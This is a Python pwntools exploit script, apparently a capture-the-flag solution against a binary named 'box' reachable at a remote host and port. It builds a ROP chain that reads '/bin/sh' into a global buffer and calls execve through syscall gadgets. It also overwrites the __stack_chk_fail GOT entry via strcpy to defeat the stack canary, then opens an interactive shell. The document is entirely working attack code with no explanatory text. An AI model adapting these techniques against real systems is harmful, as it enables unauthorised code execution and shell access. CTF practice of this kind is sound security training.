#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "35.221.91.124"
PORT = 10008

def globuf(user):
	r.sendline("3")
	r.sendlineafter("> ", user)
	r.recvuntil("> ")

def stack(user):
	r.sendline("4")
	r.sendlineafter("> ", user)

def exploit(r):
	r.recvuntil("> ")
	
	ADDRSP110 = 0x4bf6ac

	POPRAX = 0x000000000041ea66
	POPRDI = 0x000000000041c9ae
	POPRSI = 0x000000000041c5ec
	SYSCALL = 0x00000000004aaa45
	XOREDXPOPRCX = 0x00000000004c400d
	XOREDXSYSCALL = 0x00000000004ab5be
	
	log.info("Put gadget into global buffer")

	globuf(p64(ADDRSP110))

	log.info("Trigger stack overflow")

	payload = p64(0x48)
	payload += cyclic_metasploit(72)

	# read /bin/sh
	payload += p64(POPRAX)
	payload += p64(0)
	payload += p64(POPRDI)
	payload += p64(0)
	payload += p64(POPRSI)
	payload += p64(e.symbols["global_buf"])
	payload += p64(SYSCALL)

	# execve /bin/sh
	payload += p64(POPRAX)
	payload += p64(59)
	payload += p64(POPRDI)
	payload += p64(e.symbols["global_buf"])
	payload += p64(POPRSI)
	payload += p64(0)	
	payload += p64(XOREDXSYSCALL)
	payload += "/bin/sh\x00"
	
	payload += cyclic_metasploit(1144+8-len(payload))
	payload += p64(0x4)									# menu choice
	payload += cyclic_metasploit(32)
	payload += p64(e.symbols["global_buf"])				# strcpy rsi
	payload += "A"*8
	payload += p64(e.got["__stack_chk_fail"])			# strcpy rdi	
	payload += p64(0x4fb5c0)
	payload += p64(0xe24aa0-0x7f8)						# _Z12pagefilenameB5cxx11
	payload += p64(0x80e1c9e0-0x7fff8000)				# random address to pass check
	payload += cyclic_metasploit(3000-len(payload))
		
	stack(payload)

	r.recvuntil("> ")
	r.sendline("0")

	r.recv(1, timeout=0.5)
	r.sendline("/bin/sh\x00")

	r.interactive()

	return

if __name__ == "__main__":
	e = ELF("./box")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process("./box")
		print (util.proc.pidof(r))
		pause()
		exploit(r)
